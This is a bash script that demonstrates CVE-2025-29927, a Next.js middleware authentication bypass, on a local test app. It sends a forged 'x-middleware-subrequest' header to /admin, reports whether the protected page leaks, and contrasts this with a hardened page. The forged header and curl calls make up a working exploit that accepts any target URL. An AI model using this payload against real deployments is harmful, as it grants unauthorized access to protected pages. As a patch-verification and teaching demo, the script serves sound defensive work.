#!/usr/bin/env bash
#
# Local-only demo runner for CVE-2025-29927 (Next.js middleware auth bypass).
# Prints ONLY the signal — HTTP status, redirect target, and whether the
# protected page leaked — instead of dumping the full HTML page.
#
# Usage:
#   ./demo.sh                      # targets http://localhost:3000
#   ./demo.sh http://localhost:3000
#
set -u

BASE="${1:-http://localhost:3000}"
FORGED="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# hit <url> [extra curl args...] -> prints "HTTP <code>  ->  <location>"
hit() {
  local url="$1"; shift
  local code
  code=$(curl -s -o "$TMP/body" -D "$TMP/hdr" -w '%{http_code}' "$@" "$url") || {
    echo "  (could not reach $url — is 'npm run dev' running?)"; return 1; }
  local loc
  loc=$(awk 'tolower($1)=="location:"{print $2}' "$TMP/hdr" | tr -d '\r')
  if [ -n "$loc" ]; then
    echo "  HTTP $code  ->  $loc"
  else
    echo "  HTTP $code"
  fi
}

ver=$(node -e 'console.log(require("next/package.json").version)' 2>/dev/null || echo '?')
echo "Next.js: $ver     Target: $BASE"
echo "=================================================================="

echo
echo "[1] Honest user, NO session cookie      GET /admin"
hit "$BASE/admin"
echo "    expected: 307 -> /login   (middleware redirects)"

echo
echo "[2] Attacker forges the header          GET /admin   (+ forged header)"
hit "$BASE/admin" -H "$FORGED"
if grep -q "Welcome, authenticated admin" "$TMP/body"; then
  echo "    >>> BYPASS SUCCEEDED: admin page served with no session cookie"
else
  echo "    >>> bypass failed (this is a PATCHED build — good)"
fi

echo
echo "[3] Same attack vs hardened page        GET /admin-secure   (+ forged header)"
hit "$BASE/admin-secure" -H "$FORGED"
echo "    expected: 307 -> /login   (in-page check holds even if middleware is skipped)"
echo
